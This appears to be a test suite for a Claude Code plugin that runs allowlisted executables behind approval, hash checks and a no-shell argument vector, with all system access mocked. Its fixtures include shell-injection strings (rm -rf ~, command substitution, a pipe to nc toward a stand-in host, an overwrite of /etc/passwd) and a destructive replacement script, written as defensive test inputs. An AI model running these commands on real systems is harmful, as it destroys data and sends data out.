import { expect, mock, test } from './kit'
import type { Engine } from 'claude-code/testing'
import type { On } from 'claude-code'

import { utf8Encode } from '../hooks/codec'
import { ALLOWLIST_RELATIVE, APPROVALS_KEY, ENV_BIN, EXEC_PATH, EXEC_TIMEOUT_DEFAULT_MS } from '../hooks/exec'
import { MESSAGES } from '../hooks/i18n'
import { sha256 } from '../hooks/sha'
import { BAND, EN, EVERY_ACTION_FITS, JA, PANE, PICKER_PANE, PLUGIN, defaultProcessAnswer, execWorld, hintIcons, listedActions, runCommand, showKind, stage, start } from './stage'
import type { ExecWorld, Stage } from './stage'

// Custom actions of kind exec (SELM-00117), run through the plugin: what each
// of the three kinds hands the executable and shows, and every case in which
// nothing runs, each with its reason where the person reads it. The file
// system, the settings, the environment, the approval dialog and the process
// are all mocked (tests/stage.tsx execWorld): nothing here starts a command.

const HOME = '/Users/me'
const ALLOW = `${HOME}/${ALLOWLIST_RELATIVE}`
const TOOL = `${HOME}/bin/upper.sh`
const SCRIPT = '#!/bin/sh\ntr a-z A-Z\n'
const OTHER = '#!/bin/sh\nrm -rf ~\n'
const hashOf = (text: string) => sha256(utf8Encode(text))

const UPPER = { id: 'upper', icon: '🔠', label: 'Upper', kind: 'exec', command: TOOL, args: ['--fixed', '$(not-expanded)'] }
const TALK = { id: 'talk', icon: '🗣', label: 'Talk', kind: 'exec', command: TOOL, target: 'context', timeoutMs: 5000 }
const FREE = { id: 'free', icon: '🧾', label: 'Free', kind: 'exec', command: TOOL, target: 'none' }
const DEFS = [UPPER, TALK, FREE]
const SETTING = JSON.stringify(DEFS)
const OPTIONS = { ...EN, customActions: SETTING }

const NASTY = "x; rm -rf ~ $(touch /tmp/pwned) `id` | nc evil 1 && y\n'q' \"q\" ${HOME} > /etc/passwd"

const t = MESSAGES.en

/** The user settings that hold `setting` as this plugin's customActions, under one entry. */
const userSettings = (setting: string) => ({ pluginConfigs: { [`${PLUGIN}@market`]: { options: { customActions: setting } } } })

/**
 * The world where the exec actions may run: the person's own settings, the
 * allowlist naming TOOL (with `sha` when given), TOOL being SCRIPT, the
 * approval dialog approving. Each test changes what it is about.
 */
function setUp(on: On, opts: { setting?: string; sha?: string; answer?: string | null } = {}) {
  const s = stage(on)
  const w = execWorld(on, {
    env: { HOME, LANG: 'en_US.UTF-8', TMPDIR: '/tmp/me/', SECRET_TOKEN: 'hunter2' },
    files: {
      [HOME]: { kind: 'dir' },
      '/repo': { kind: 'dir' },
      [ALLOW]: { content: JSON.stringify({ executables: [{ path: TOOL, ...(opts.sha === undefined ? {} : { sha256: opts.sha }) }] }) },
      [TOOL]: { content: SCRIPT },
    },
    messages: [
      { role: 'user', text: 'why `id`?' },
      { role: 'assistant', text: 'because $(x)' },
    ],
    answer: opts.answer === undefined ? t.execApprove : opts.answer,
  })
  s.sourceSettings.user = userSettings(opts.setting ?? SETTING)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 0, stdout: 'HELLO WORLD\n' } : defaultProcessAnswer(argv))
  return { s, w }
}

/** The exec runs asked of $.process.run (uname aside). */
const execRuns = (s: Stage) => s.processRuns.filter(r => r.argv[0] === ENV_BIN)

/** Every text the result pane draws now. */
async function paneTexts($: Engine): Promise<string[]> {
  const pane = await $.ui.mount({ ...PANE, surface: 'terminal' })
  const texts = (await pane.findAll({ type: 'Text' })).map(f => f.text)
  await pane.unmount()
  return texts
}

const expectedArgv = (target: string, args: readonly string[] = []) => [
  ENV_BIN,
  '-i',
  `PATH=${EXEC_PATH}`,
  `HOME=${HOME}`,
  'LANG=en_US.UTF-8',
  'TMPDIR=/tmp/me/',
  `QUICK_ACTIONS_TARGET=${target}`,
  'QUICK_ACTIONS_LANG=en',
  TOOL,
  ...args,
]

// ---------------------------------------------------------------------------
// The three kinds run

test('[ ] selection: approved once at the terminal, the selection on stdin alone, the output in the pane', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  s.selected = NASTY
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  expect(await hintIcons(band)).toContain('[🔠]')
  await band.press({ key: 'upper' })
  await clock.settle()

  // Asked once, showing what runs.
  expect(w.asked).toHaveLength(1)
  expect(w.asked[0]?.options).toEqual([t.execApprove, t.execCancel])
  expect(w.asked[0]?.header).toBe(t.execApproveHeader)
  expect(w.asked[0]?.question).toContain(TOOL)
  expect(w.asked[0]?.question).toContain(hashOf(SCRIPT))
  expect(w.asked[0]?.question).toContain('["--fixed","$(not-expanded)"]')

  // Run with no shell: env -i, the variables allowed, the path, the fixed arguments as written.
  const runs = execRuns(s)
  expect(runs).toEqual([{ argv: expectedArgv('selection', ['--fixed', '$(not-expanded)']), cwd: HOME, stdin: NASTY, timeoutMs: EXEC_TIMEOUT_DEFAULT_MS }])
  // Nothing of the selection in the argument vector, nor any other variable of the host.
  for (const a of runs[0]!.argv) {
    expect(a).not.toContain('rm -rf')
    expect(a).not.toContain('pwned')
    expect(a).not.toContain('hunter2')
  }
  expect(s.stored[APPROVALS_KEY]).toEqual({ upper: { path: TOOL, args: ['--fixed', '$(not-expanded)'], sha256: hashOf(SCRIPT) } })
  expect(await paneTexts($)).toContain('HELLO WORLD')

  // Approved: the next run asks nothing.
  s.selected = null
  await clock.advance(400)
  s.selected = 'again'
  await clock.advance(400)
  await band.press({ key: 'upper' })
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s).map(r => r.stdin)).toEqual([NASTY, 'again'])
})

test('< > context: the conversation as JSON of role and text on stdin, by the command typed at the prompt', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  const r = await runCommand($, 'talk')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(t.showing('Quick Actions', 'Talk'))
  expect(w.asked).toHaveLength(1)
  const runs = execRuns(s)
  expect(runs).toHaveLength(1)
  expect(runs[0]?.argv).toEqual(expectedArgv('context'))
  expect(runs[0]?.timeoutMs).toBe(5000)
  expect(JSON.parse(runs[0]!.stdin!)).toEqual([
    { role: 'user', text: 'why `id`?' },
    { role: 'assistant', text: 'because $(x)' },
  ])
  expect(await paneTexts($)).toContain('HELLO WORLD')
})

test('{ } standalone: its argument on stdin, never in the argument vector', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await start($)
  await runCommand($, `free ${NASTY.split('\n')[0]}`)
  await clock.settle()
  const runs = execRuns(s)
  expect(runs).toHaveLength(1)
  expect(runs[0]?.argv).toEqual(expectedArgv('none'))
  expect(runs[0]?.stdin).toBe(NASTY.split('\n')[0])

  // With no argument: empty stdin.
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)[1]?.stdin).toBe('')
})

test('{ } standalone from the hint line: the argument screen, then the run with what was typed', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await start($)
  await runCommand($, 'hint')
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  await showKind(band, 'standalone')
  await band.press({ key: 'free' })
  const picker = await $.ui.mount({ ...PICKER_PANE, surface: 'terminal' })
  await picker.input({ key: '_arg', text: 'abc | def' })
  await clock.settle()
  expect(execRuns(s).map(r => r.stdin)).toEqual(['abc | def'])
})

// ---------------------------------------------------------------------------
// How a run ends

test('an exit code other than 0 is a failure: the code and the standard error shown, escaped', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 3, stdout: '', stderr: 'boom \u001b[31m' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain(t.failed(t.execExit(3)))
  expect(texts).toContain(t.execStderr)
  expect(texts).toContain('boom \\u001b[31m')
  expect(texts).not.toContain('\u001b')
})

test('the timeout is a failure that says so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { deny: 'Command timed out' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect((await paneTexts($)).join('\n')).toContain(t.failed(t.execTimeout(30)))
})

test('a start that fails is a failure that says why', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { deny: 'spawn EACCES' } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain(t.failed(t.execNotStarted('').slice(0, -2)))
  expect(texts).toContain('spawn EACCES')
})

test('the output: hidden characters escaped as a model answer is, nothing written said so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  let out = 'red \u001b[31mX\u001b[0m zero\u200Bwidth'
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 0, stdout: out } : defaultProcessAnswer(argv))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const texts = (await paneTexts($)).join('\n')
  expect(texts).toContain('red \\u001b[31mX\\u001b[0m zero\\u200bwidth')
  expect(texts).not.toMatch(/[\u001b\u200B]/)
  out = ''
  await runCommand($, 'free')
  await clock.settle()
  expect(await paneTexts($)).toContain(t.execNoOutput)
})

// ---------------------------------------------------------------------------
// Nothing runs: the approval

const refusedIn = async ($: Engine, s: Stage, reason: string) => {
  expect(execRuns(s)).toEqual([])
  expect((await paneTexts($)).join('\n')).toContain(reason)
  expect(s.toasts.some(x => x.includes(reason))).toBe(true)
}

for (const [name, answer] of [
  ['Cancel', t.execCancel],
  ['the dialog dismissed', null],
  ['a text typed under Other', `${t.execApprove} `],
] as const) {
  test(`not approved (${name}): nothing runs, and why is shown`, { options: OPTIONS }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on, { answer })
    await start($)
    await runCommand($, 'free')
    await clock.settle()
    expect(w.asked).toHaveLength(1)
    expect(s.stored[APPROVALS_KEY]).toBeUndefined()
    await refusedIn($, s, t.customReason({ code: 'execDeclined' }))
  })
}

test('not approved and asked from afar (the bridge, a remote surface): never asked, nothing runs; approved, it runs from there', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  await $.command.run({ command: PLUGIN, args: 'free', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  expect(w.asked).toEqual([])
  await refusedIn($, s, t.customReason({ code: 'execRemote' }))

  // A press on the mobile app's hint line: the same.
  await runCommand($, 'hint')
  const band = await $.ui.mount({ ...BAND, surface: 'mobile', viewport: EVERY_ACTION_FITS })
  await showKind(band, 'context')
  await band.press({ key: 'talk' })
  await clock.settle()
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])

  // Approved at the terminal once: then it runs from afar too.
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  await $.command.run({ command: PLUGIN, args: 'free', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(2)
})

test('approved, then its arguments changed: asked again (and refused from afar)', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  // An approval kept for other arguments.
  s.stored[APPROVALS_KEY] = { upper: { path: TOOL, args: ['--fixed'], sha256: hashOf(SCRIPT) } }
  await start($)
  s.selected = 'abc'
  await $.command.run({ command: PLUGIN, args: 'upper', origin: { kind: 'bridge' }, presentation: { isFullscreen: true, columns: 120 } })
  await clock.settle()
  await refusedIn($, s, t.customReason({ code: 'execRemote' }))
  await runCommand($, 'upper')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(1)
})

test('approved, then the executable replaced: asked again, showing the new SHA-256', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  w.files[TOOL] = { content: OTHER }
  w.answer = t.execCancel
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(2)
  expect(w.asked[1]?.question).toContain(hashOf(OTHER))
  expect(execRuns(s)).toHaveLength(1)
})

test('replaced while the approval was up: not run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.onAsk = () => {
    w.files[TOOL] = { content: OTHER }
  }
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  await refusedIn($, s, t.customReason({ code: 'execChanged' }))
})

// ---------------------------------------------------------------------------
// Nothing runs: the allowlist and the executable

test('the SHA-256 in the allowlist not matching: nothing asked, nothing run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { sha: hashOf(OTHER) })
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toEqual([])
  await refusedIn($, s, t.customReason({ code: 'execHashMismatch', path: TOOL }))
})

test('the SHA-256 in the allowlist matching (in capitals too): it runs', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on, { sha: hashOf(SCRIPT).toUpperCase() })
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
})

test('the allowlisted path now a link to another file: not in the allowlist, nowhere shown, never run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[TOOL] = { realPath: '/tmp/evil.sh' }
  w.files['/tmp/evil.sh'] = { content: OTHER }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  const reason = t.customReason({ code: 'execNotAllowed', path: '/tmp/evil.sh' })
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customIgnoredId('free', reason)).slice(1, -1))
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('a command that is a link to the allowlisted file: it runs that file, by the path it lands on', { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command: '/Users/me/link' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command: '/Users/me/link' }]) })
  w.files['/Users/me/link'] = { realPath: TOOL }
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s).map(r => r.argv.at(-1))).toEqual([TOOL])
  expect(w.asked[0]?.question).toContain(TOOL)
})

test('a command that lands on a path with =: never handed to env, and why is shown', { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command: '/Users/me/plain' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command: '/Users/me/plain' }]) })
  w.files['/Users/me/plain'] = { realPath: '/Users/me/a=b' }
  w.files['/Users/me/a=b'] = { content: SCRIPT }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execPath', field: 'realPath', path: '/Users/me/a=b' })).slice(1, -1))
  expect(execRuns(s)).toEqual([])
})

for (const [name, command] of [
  ['a relative path', 'bin/upper.sh'],
  ['a name looked up in PATH', 'tr'],
  ['a path with ~', '~/bin/upper.sh'],
] as const) {
  test(`${name}: refused as written, told, never run`, { options: { ...EN, customActions: JSON.stringify([{ ...FREE, command }]) } }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on, { setting: JSON.stringify([{ ...FREE, command }]) })
    await start($)
    const r = await runCommand($, 'free')
    await clock.settle()
    expect(JSON.stringify(r)).toContain(t.customIgnoredId('free', '').slice(0, 20))
    expect(JSON.stringify(r)).toContain('write command as the executable')
    expect(w.asked).toEqual([])
    expect(execRuns(s)).toEqual([])
  })
}

test('a command in no allowlist entry: left out at load, told on all three paths', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[ALLOW] = { content: JSON.stringify({ executables: [{ path: '/opt/other.sh' }, { path: 'relative' }] }) }
  await start($)
  await clock.settle()
  const reason = t.customReason({ code: 'execNotAllowed', path: TOOL })
  // The toast: every definition refused (three) and the entry left out, the first reason.
  expect(s.toasts).toHaveLength(1)
  expect(s.toasts[0]).toContain('4 problem(s)')
  expect(s.toasts[0]).toContain(`#1 (upper): ${reason}`)
  // The command: each listed.
  const r = JSON.stringify(await runCommand($, ''))
  for (const line of [`- #1 (upper): ${reason}`, `- #2 (talk): ${reason}`, `- #3 (free): ${reason}`, `- ${t.customReason({ code: 'execAllowlistEntry', entry: 2 })}`]) {
    expect(r).toContain(JSON.stringify(line).slice(1, -1))
  }
  // The pane's top.
  const texts = await paneTexts($)
  expect(texts).toContain(t.customProblemsHeading)
  expect(texts).toContain(`- #1 (upper): ${reason}`)
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('no allowlist file: every exec definition refused, never asked, never run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  delete w.files[ALLOW]
  await start($)
  const r = await runCommand($, 'talk')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execAllowlist', why: 'missing' })).slice(1, -1))
  expect(w.asked).toEqual([])
  expect(execRuns(s)).toEqual([])
})

test('the allowlist landing in the project (a link into the repository): not read', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.files[ALLOW] = { realPath: '/repo/allowed.json' }
  w.files['/repo/allowed.json'] = { content: JSON.stringify({ executables: [{ path: TOOL }] }) }
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(JSON.stringify(t.customReason({ code: 'execAllowlist', why: 'inProject' })).slice(1, -1))
  expect(w.reads).not.toContain('/repo/allowed.json')
  expect(execRuns(s)).toEqual([])
})

test('on Windows: refused, said so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  w.env['OS'] = 'Windows_NT'
  await start($)
  const r = await runCommand($, 'free')
  await clock.settle()
  expect(JSON.stringify(r)).toContain(t.customReason({ code: 'execUnsupported' }))
  expect(execRuns(s)).toEqual([])
})

// ---------------------------------------------------------------------------
// Nothing runs: where the definition came from

for (const [name, change, why] of [
  ['written in the project alone (the user settings without it)', (s: Stage) => (s.sourceSettings.user = {}), 'keys'],
  ['the project overriding the person\'s text', (s: Stage) => (s.sourceSettings.user = userSettings('[]')), 'mismatch'],
  [
    'two entries of the plugin in the user settings',
    (s: Stage) =>
      (s.sourceSettings.user = { pluginConfigs: { [`${PLUGIN}@a`]: { options: { customActions: SETTING } }, [`${PLUGIN}@inline`]: { options: { customActions: SETTING } } } }),
    'keys',
  ],
  ['HOME moved by the project settings', (s: Stage) => (s.sourceSettings.project = { env: { HOME: '/repo' } }), 'home'],
  ['HOME moved by the local settings', (s: Stage) => (s.sourceSettings.local = { env: { HOME: '/repo' } }), 'home'],
  ['the user settings not readable', (s: Stage) => (s.sourceDeny = ['user']), 'unreadable'],
] as const) {
  test(`not the person's own (${name}): never asked, never run, said why`, { options: OPTIONS }, async ($, on) => {
    const clock = mock.clock(on)
    const { s, w } = setUp(on)
    change(s)
    await start($)
    await clock.settle()
    const reason = t.customReason({ code: 'execScope', why })
    expect(s.toasts[0]).toContain(reason)
    for (const id of ['upper', 'talk', 'free']) {
      s.selected = 'abc'
      const r = await runCommand($, id)
      expect(JSON.stringify(r)).toContain(JSON.stringify(t.customIgnoredId(id, reason)).slice(1, -1))
    }
    await clock.settle()
    expect(w.asked).toEqual([])
    expect(execRuns(s)).toEqual([])
    expect(w.reads).toEqual([])
  })
}

// ---------------------------------------------------------------------------
// The gate: what is shown, checked once

test('refused exec actions are on neither the hint line nor the ⋯ dialog, even pinned; allowed ones are', { options: { ...EN, customActions: JSON.stringify([UPPER, { ...UPPER, id: 'bad', icon: '🚫', command: '/opt/nope.sh' }]), pinActions: 'bad,upper' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on, { setting: JSON.stringify([UPPER, { ...UPPER, id: 'bad', icon: '🚫', command: '/opt/nope.sh' }]) })
  w.files['/opt/nope.sh'] = { content: SCRIPT }
  await start($)
  s.selected = 'abc'
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  const icons = await hintIcons(band)
  expect(icons[0]).toBe('[🔠]')
  expect(icons).not.toContain('[🚫]')
  await runCommand($, '')
  const picker = await $.ui.mount({ ...PICKER_PANE, surface: 'terminal' })
  const listed = await listedActions(picker)
  expect(listed).toContain('upper')
  expect(listed).not.toContain('bad')
  // Checked once for the load, however many drew and ran.
  expect(s.sourceReads.filter(x => x === 'user')).toHaveLength(1)
})

test('the gate checked before session.start is the same one: a command run first', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  await runCommand($, 'free')
  await start($)
  await clock.settle()
  await runCommand($, 'free')
  await clock.settle()
  expect(s.sourceReads.filter(x => x === 'user')).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(2)
})

test('no exec definition: no settings source and no file is read', { options: { ...JA, customActions: JSON.stringify([{ id: 'mine', icon: '🪄', label: 'Mine', kind: 'complete', model: 'haiku', prompt: 'Do.' }]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  await start($)
  s.selected = 'abc'
  await clock.advance(400)
  const band = await $.ui.mount({ ...BAND, surface: 'terminal', viewport: EVERY_ACTION_FITS })
  await band.press({ key: 'mine' })
  await runCommand($, '')
  await clock.settle()
  expect(s.sourceReads).toEqual([])
  expect(w.reads).toEqual([])
  expect(s.toasts).toEqual([])
})

test('static and gate problems together: the toast counts both', { options: { ...EN, customActions: JSON.stringify([{ ...UPPER, id: 'p', prompt: 'x' }, FREE]) } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on, { setting: JSON.stringify([{ ...UPPER, id: 'p', prompt: 'x' }, FREE]) })
  s.sourceSettings.project = { env: { HOME: '/repo' } }
  await start($)
  await clock.settle()
  expect(s.toasts).toHaveLength(1)
  expect(s.toasts[0]).toContain('2 problem(s)')
  expect(s.toasts[0]).toContain('#1 (p): a definition of kind exec cannot have prompt')
})
